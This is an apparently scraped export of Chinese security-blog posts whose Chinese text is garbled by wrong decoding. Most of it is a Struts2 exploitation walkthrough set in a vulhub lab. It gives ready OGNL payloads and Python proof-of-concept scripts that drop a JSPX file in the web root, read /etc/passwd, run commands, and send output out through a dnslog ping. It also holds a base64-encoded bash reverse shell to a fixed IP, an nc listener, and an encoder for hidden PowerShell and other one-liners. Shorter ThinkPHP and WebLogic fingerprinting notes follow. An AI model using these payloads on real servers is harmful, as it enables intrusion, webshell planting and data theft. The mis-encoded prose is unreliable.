1redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%221.jspx%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22BINGO%22)%2C%23genxor.flush()%2C%23genxor.close()%7D æ‹¼æ¥é¶åœºåœ°å€ 1http://ip:8080/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%221.jspx%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22BINGO%22)%2C%23genxor.flush()%2C%23genxor.close()%7D æ‰§è¡Œç»“æœã€‚ä¸Šä¼ æˆåŠŸ S2-008åœ¨devmodeæ¨¡å¼ä¸‹ç›´æ¥æ·»åŠ å‚æ•°?debug=command&amp;expression=&lt;OGNL EXP&gt;ï¼Œä¼šç›´æ¥æ‰§è¡Œåé¢çš„ognlè¡¨è¾¾å¼ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤. ç¯å¢ƒæˆåŠŸå¯åŠ¨ æ–‡ä»¶è¯»å– POC 1/devmode.action?debug=command&amp;expression=(#w=new java.io.File(&quot;/etc/passwd&quot;),#a=new java.io.FileInputStream(#w),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#d)),#f.getWriter().flush(),#f.getWriter().close()) è¿›è¡ŒURLç¼–ç  1/devmode.action?debug=command&amp;expression=%28%23w%3Dnew%20java.io.File%28%22%2fetc%2fpasswd%22%29%2C%23a%3Dnew%20java.io.FileInputStream%28%23w%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23d%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%29 æ‰§è¡Œ å‘½ä»¤æ‰§è¡Œ POC æ‰§è¡Œçš„å‘½ä»¤ä¸ºè¯»å–/etc/passwdæ–‡ä»¶ 1/devmode.action? debug=command&amp;expression=(#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[5000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()) URLç¼–ç  1/devmode.action?debug=command&amp;expression=%28%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%22cat%22%2C%22%2fetc%2fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B5000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%29 æ‰§è¡Œ æ‰§è¡Œls 1/devmode.action? debug=command&amp;expression=(#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[5000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()) ç¼–ç  1http://localhost:8080/devmode.action?debug=command&amp;expression=(%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22ls%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B5000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()) S2-057ç¯å¢ƒå¯åŠ¨ http://localhost:8080/struts2-showcase éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ è¿›è¡Œä¸€ä¸ªç®—æ•°ï¼Œçœ‹æ˜¯å¦è¿”å›ç»“æœ &#123;7*7&#125;è¦è¿›è¡Œurlç¼–ç ï¼Œç»“æœå¦‚ä¸‹ 1http://your-ip:8080/struts2-showcase/$%7B7*7%7D/actionChain1.action æŠ“åŒ…ï¼Œå¾—åˆ°äº†ç®—æ•°ç»“æœ49.è¯´æ˜å­˜åœ¨è¯¥æ¼æ´ POCéªŒè¯ 1http://ip:8080/struts2-showcase/&lt;ognlè¡¨è¾¾å¼&gt;/actionChain1.action æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ id 12$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125; urlç¼–ç  12%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action æ‰§è¡Œå…¶ä»–å‘½ä»¤çš„ç»“æœ(ls)ğŸ‘‡ S2-059è¯¥æ¼æ´è·Ÿ057å·®ä¸å¤šï¼Œå®ƒåˆ©ç”¨çš„æ˜¯idæ ‡ç­¾çš„äºŒæ¬¡è§£æã€‚ ç¯å¢ƒå¯åŠ¨ http://ip:8080/.action éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ 1http://your-ip:8080/?id=%25%7B233*233%7D å¯ä»¥è®¡ç®—å‡º233*233çš„ç»“æœ å®˜æ–¹POCéªŒè¯ 12345678910111213import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) æ‰§è¡Œpocåï¼Œè¿›å…¥å®¹å™¨ï¼Œå‘ç°å‘½ä»¤touch /tmp/successè¢«æˆåŠŸæ‰§è¡Œï¼Œç”Ÿæˆäº†successæ–‡ä»¶ã€‚ å…¶ä»–POCéªŒè¯æ–¹å¼ DNSlogå¸¦å‡ºå›æ˜¾ å›æ˜¾ï¼Œå¯ä»¥ä¿®æ”¹æˆping xxx.dnslog.cnï¼Œç›´æ¥æ‰§è¡Œï¼Œå¸¦å‡ºå›æ˜¾ã€‚ pythonæ‰§è¡Œ 12345678910111213import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;ping erp3sn.dnslog.cn&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) åå¼¹shell baseç¼–ç å°å·¥å…· 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;java runtime exec usage...&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot;&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type Bash here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; ç¼–ç  pythonæ‰§è¡Œ 12345678910111213import requestsurl = &quot;http://192.168.0.14:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) ç›‘å¬ 1nc -lvnp 6666 æ”»å‡»æµ‹è¯•æˆåŠŸ å‚è€ƒæ–‡ç« https://blog.csdn.net/weixin_42633229/article/details/117087180 https://www.51cto.com/article/621101.html https://www.codercto.com/a/22088.html https://zhuanlan.zhihu.com/p/348999160 https://github.com/vulhub/vulhub/tree/master/struts2/ https://blog.csdn.net/T780000063/article/details/111054037","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"https://gryffinbit.top/tags/struts2/"}],"author":"Gryffinbit"},{"title":"thinkphpä»‹ç»","slug":"thinkphpä»‹ç»","date":"2022-10-17T18:49:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/18/thinkphpä»‹ç»/","permalink":"https://gryffinbit.top/2022/10/18/thinkphp%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"ä»‹ç»â€‹ ThinkPHPæ˜¯å¼€æºè½»é‡çº§PHPæ¡†æ¶ã€‚PHPæ¡†æ¶æ˜¯è®¸å¤šä»£ç çš„é›†åˆï¼Œè¿™äº›ä»£ç æ˜¯ç¨‹åºç»“æ„çš„ä»£ç ï¼ˆå¹¶ä¸æ˜¯ä¸šåŠ¡ä»£ç ï¼‰ï¼Œä»£ç ä¸­æœ‰è®¸å¤šå‡½æ•°ã€ç±»ã€åŠŸèƒ½ç±»åŒ…ï¼Œæ¡†æ¶çš„ä»£ç æŒ‰ç…§ä¸€å®šçš„æ ‡å‡†ç»„æˆäº†ä¸€ä¸ªæœ‰æœºåŠŸèƒ½ä½“ï¼Œè¿™ä¸ªåŠŸèƒ½ä½“ä¸­æœ‰è®¸å¤šè®¾è®¡æ¨¡å¼ï¼Œæ¯”å¦‚MVCã€å•ä¾‹ã€ARç­‰ â€‹ ThinkPHPæ˜¯ä¸€ä¸ªå¿«é€Ÿã€å…¼å®¹è€Œä¸”ç®€å•çš„è½»é‡çº§å›½äº§PHPå¼€å‘æ¡†æ¶ï¼Œè¯ç”Ÿäº2006å¹´åˆï¼ŒåŸåFCSï¼Œ2007å¹´å…ƒæ—¦æ­£å¼æ›´åä¸ºThinkPHPï¼Œéµå¾ªApache2å¼€æºåè®®å‘å¸ƒï¼Œä»Strutsç»“æ„ç§»æ¤è¿‡æ¥å¹¶åšäº†æ”¹è¿›å’Œå®Œå–„ï¼ŒåŒæ—¶ä¹Ÿå€Ÿé‰´äº†å›½å¤–å¾ˆå¤šä¼˜ç§€çš„æ¡†æ¶å’Œæ¨¡å¼ï¼Œä½¿ç”¨é¢å‘å¯¹è±¡çš„å¼€å‘ç»“æ„å’ŒMVCæ¨¡å¼ï¼Œèåˆäº†Strutsçš„æ€æƒ³å’ŒTagLibï¼ˆæ ‡ç­¾åº“ï¼‰ã€RoRçš„ORMæ˜ å°„å’ŒActiveRecordæ¨¡å¼ã€‚ ThinkPHPå¯ä»¥æ”¯æŒwindows&#x2F;Unix&#x2F;Linuxç­‰æœåŠ¡å™¨ç¯å¢ƒï¼Œæ­£å¼ç‰ˆéœ€è¦PHP5.0ä»¥ä¸Šç‰ˆæœ¬æ”¯æŒï¼Œæ”¯æŒMySqlã€PgSQLã€Sqliteå¤šç§æ•°æ®åº“ä»¥åŠPDOæ‰©å±•ï¼ŒThinkPHPæ¡†æ¶æœ¬èº«æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«æ¨¡å—è¦æ±‚ï¼Œå…·ä½“çš„åº”ç”¨ç³»ç»Ÿè¿è¡Œç¯å¢ƒè¦æ±‚è§†å¼€å‘æ‰€æ¶‰åŠçš„æ¨¡å—ã€‚ ä½œä¸ºä¸€ä¸ªæ•´ä½“å¼€å‘è§£å†³æ–¹æ¡ˆï¼ŒThinkPHPèƒ½å¤Ÿè§£å†³åº”ç”¨å¼€å‘ä¸­çš„å¤§å¤šæ•°éœ€è¦ï¼Œå› ä¸ºå…¶è‡ªèº«åŒ…å«äº†åº•å±‚æ¶æ„ã€å…¼å®¹å¤„ç†ã€åŸºç±»åº“ã€æ•°æ®åº“è®¿é—®å±‚ã€æ¨¡æ¿å¼•æ“ã€ç¼“å­˜æœºåˆ¶ã€æ’ä»¶æœºåˆ¶ã€è§’è‰²è®¤è¯ã€è¡¨å•å¤„ç†ç­‰å¸¸ç”¨çš„ç»„ä»¶ï¼Œå¹¶ä¸”å¯¹äºè·¨ç‰ˆæœ¬ã€è·¨å¹³å°å’Œè·¨æ•°æ®åº“ç§»æ¤éƒ½æ¯”è¾ƒæ–¹ä¾¿ã€‚å¹¶ä¸”æ¯ä¸ªç»„ä»¶éƒ½æ˜¯ç²¾å¿ƒè®¾è®¡å’Œå®Œå–„çš„ï¼Œåº”ç”¨å¼€å‘è¿‡ç¨‹ä»…ä»…éœ€è¦å…³æ³¨ä¸šåŠ¡é€»è¾‘ã€‚ æ¡†æ¶æ–‡ä»¶ä»‹ç» è§£å‹åå¾—åˆ° 123456Application --åº”ç”¨ç¨‹åºç›®å½•,å½“ç¨‹åºå¼€å‘æ—¶è‡ªåŠ¨ç”Ÿæˆ,é»˜è®¤ä¸ºç©º;Public --å…¬å…±èµ„æºæ–‡ä»¶ç›®å½•,å­˜æ”¾ä¸€äº›å…¬ç”¨çš„æ–‡ä»¶,é»˜è®¤ä¸ºç©º; ThinkPHP --æ¡†æ¶ç›®å½•,æ¡†æ¶çš„æ ¸å¿ƒæ¶æ„ç¨‹åºåŒ…; README.md --è¯´æ˜æ–‡ä»¶,å¯åˆ ;.htaccess --é…ç½®æ–‡ä»¶,ä¸€èˆ¬ç”¨äºé…ç½®ä¼ªé™æ€; Index.php --å…¥å£æ–‡ä»¶,æ‰€æœ‰ç¨‹åºéƒ½é€šè¿‡è¿™é‡Œè®¿é—®ã€‚ å¯¹äº ThinkPHP æ¡†æ¶ç›®å½•å†…,ä¹Ÿå«æœ‰å¤§é‡çš„ç›®å½•åŠæ–‡ä»¶: 12345678910111213141516Common --æ ¸å¿ƒå…¬å…±å‡½æ•°ç›®å½•Conf --æ ¸å¿ƒé…ç½®ç›®å½•Lang --æ ¸å¿ƒè¯­è¨€åŒ…ç›®å½•Library --æ¡†æ¶ç±»åº“ç›®å½• |--Think --æ ¸å¿ƒ Think ç±»åº“åŒ…ç›®å½• |--Behavior --è¡Œä¸ºç±»åº“ç›®å½• |--Org --Org ç±»åº“åŒ…ç›®å½• |--Vendor --ç¬¬ä¸‰æ–¹ç±»åº“ç›®å½• |--... --æ›´å¤šç±»åº“ç›®å½•Mode --æ¡†æ¶åº”ç”¨æ¨¡å¼ç›®å½•Tpl --ç³»ç»Ÿæ¨¡ç‰ˆç›®å½•LICENSE.txt --æ¡†æ¶æˆæƒåè®®æ–‡ä»¶logo.png --æ¡†æ¶ LOGO æ–‡ä»¶README.txt --æ¡†æ¶ README æ–‡ä»¶index.php --æ¡†æ¶å…¥å£æ–‡ä»¶ åˆ¤æ–­ç½‘ç«™æ˜¯å¦ä¸ºthinkphpåœ¨URLé‡Œæ·»åŠ å­—ç¬¦ï¼Œçœ‹æŠ¥é”™å†…å®¹","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"weblogicä»‹ç»","slug":"weblogicä»‹ç»","date":"2022-10-14T09:58:59.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/14/weblogicä»‹ç»/","permalink":"https://gryffinbit.top/2022/10/14/weblogic%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"weblogicä»‹ç»weblogicæ˜¯oracleå‡ºå“çš„åº”ç”¨æœåŠ¡ï¼Œæ˜¯ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„ä¸­é—´ä»¶ã€‚BEA Weblogicæ˜¯ç”¨äºå¼€å‘ã€é›†æˆã€éƒ¨ç½²å’Œç®¡ç†å¤§å‹åˆ†å¸ƒå¼Webåº”ç”¨ã€ç½‘ç»œåº”ç”¨å’Œæ•°æ®åº“åº”ç”¨çš„Javaåº”ç”¨æœåŠ¡å™¨ ä¸‹è½½éƒ¨ç½²ã€‚https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html é»˜è®¤ç«¯å£7001 å¿«é€Ÿåˆ¤æ–­ç½‘ç«™æ˜¯å¦ä½¿ç”¨weblogicweblogicæŒ‡çº¹ç‰¹å¾åˆ¤æ–­è¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„URLè·¯å¾„ï¼Œçœ‹WebæœåŠ¡æ˜¯å¦è¿”å›å¦‚ä¸‹â€œFrom RFC 2068Hypertext Transfer Protocolâ€å…³é”®å­—ï¼Œå³å¯åˆ¤æ–­å‡ºæ˜¯å¦ä½¿ç”¨Weblogicä¸­é—´ä»¶æ¥ã€‚ Weblogicå†…ç½®URLè·¯å¾„åˆ¤æ–­å¯¹äºæœ‰äº›ç½‘ç«™å±è”½äº†404é”™è¯¯å›æ˜¾çš„æƒ…å†µï¼Œå¯ä»¥é€šè¿‡è®¿é—®Weblogicå†…ç½®Webç›®å½•æ˜¯å¦å­˜åœ¨å»é—´æ¥å»åˆ¤æ–­æ˜¯å¦ä½¿ç”¨äº†Weblogicä¸­é—´ä»¶ã€‚æ¯”å¦‚/consolehelp/ã€/bea_wls_internal/ã€/console/ç­‰è·¯å¾„æ˜¯Weblogicä¸“æœ‰çš„ï¼Œå†æ¯”å¦‚è¯´å¯ä»¥è®¿é—®Weblogicä¸“æœ‰çš„æ¼æ´CVE-2017-10271ã€CVE-2019-2729ç­‰å¯¹åº”çš„URLè·¯å¾„(&#x2F;wls-wsat&#x2F;ã€&#x2F;_async&#x2F;ç­‰)ï¼Œä½†æ˜¯è¿™ä¸ªæ–¹æ³•ä¸æ¨èä½¿ç”¨ï¼Œå› ä¸ºåŸºæœ¬ä¸Šéƒ½ä¼šè¢«WAFæ‹¦æˆªï¼Œæ›´ä¸¥é‡çš„æƒ…å†µæ˜¯ä¼šå¯¼è‡´å°IPï¼Œå¯¼è‡´åç»­æ­£å¸¸è·¯å¾„ä¹Ÿæ— æ³•åˆ¤æ–­å‡ºæ¥ï¼Œè€Œä¸”å¤§å¤šæ•°ç”²æ–¹å®¢æˆ·ä¿®å¤æ¼æ´çš„æ–¹æ³•ï¼Œå°±æ˜¯ç›´æ¥åˆ é™¤å­˜åœ¨æ¼æ´çš„waråŒ…ï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªè·¯å¾„ä¹Ÿä¸å­˜åœ¨ã€‚ åˆ¤æ–­ç‰ˆæœ¬å·è®¿é—®consoleç›®å½• è®¿é—®&#x2F;console&#x2F;ç›®å½•ï¼Œå·¦ä¸‹è§’ä¼šæœ‰weblogicç‰ˆæœ¬å· é€šè¿‡T3åè®®è·å– é€šè¿‡T3åè®®å¯ä»¥ç›´æ¥è·å–Weblogicç‰ˆæœ¬å·ï¼Œç¼ºç‚¹æ˜¯ç°åœ¨Weblogicçš„T3ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šçš„æƒ…å†µå¾ˆå°‘äº†ï¼Œå¾ˆå¤šæ—¶å€™åœ¨å‰é¢ä¼šæ”¾ç½®ä¸€ä¸ªnginxåå‘ä»£ç†ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒT3è¯†åˆ«ç‰ˆæœ¬å·çš„æ–¹æ³•å°±ç”¨ä¸äº†äº†ã€‚ å¯ä»¥ä½¿ç”¨nmapå»è¯†åˆ« 1nmap 192.168.237.235 -p 7130 --script=&quot;weblogic-t3-info.nse&quot; -v -Pn -n -sV --open -T4 è¿˜å¯ä»¥ä»GitHubä¸Šä¸‹è½½T3åè®®çš„å‘åŒ…ä»£ç ï¼Œä¿®æ”¹ä¸€ä¸‹ï¼Œç›´æ¥æŠŠT3åè®®çš„è¿”å›åŒ…è¾“å‡ºï¼Œå°±å¯ä»¥ç›´æ¥çœ‹åˆ°ç‰ˆæœ¬å·äº†ã€‚ é€šè¿‡CVE-2022-21371æ–‡ä»¶åŒ…å«æ¼æ´åˆ¤æ–­ è¿™ä¸ªæ¼æ´æ˜¯2022å¹´å‡ºç°çš„æ¼æ´ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥è·³è½¬ç›®å½•å¯¹Weblogicçš„&#x2F;WEB-INF&#x2F;xmlã€jspã€htmlæ–‡ä»¶ç­‰è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚è¿™ä¹Ÿæ˜¯è¢«å¤§å®¶å¿½ç•¥çš„ä¸€ä¸ªNdayæ¼æ´ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ¼æ´ï¼Œé—´æ¥åˆ¤æ–­å‡ºweblogicçš„ç‰ˆæœ¬å·ã€‚ æ€è·¯æ˜¯ï¼Œfast_track.htmlè¿™ä¸ªæ–‡ä»¶çš„æ˜¾ç¤ºå†…å®¹æœ‰ä¸ªæ—¶é—´ï¼Œæ¯ä¸€ä¸ªç»†å¾®ç‰ˆæœ¬å¤§è‡´å¯¹åº”ç€ä¸€ä¸ªweblogicçš„ç»†å¾®ç‰ˆæœ¬å·ï¼Œç”¨æ¥åšç‰ˆæœ¬è¯†åˆ«æ°åˆ°å¥½å¤„ã€‚ è®¿é—®.&#x2F;&#x2F;fast_track.htmlï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯¹äºWeblogicçš„12.2.1.3.0ç‰ˆæœ¬ï¼Œæ­¤æ–‡ä»¶å›æ˜¾æ—¶é—´å†…å®¹æ˜¯1996ï¼Œ2017 é€šè¿‡è¿”å›å¤´åˆ¤æ–­ å‚è€ƒæ–‡ç« 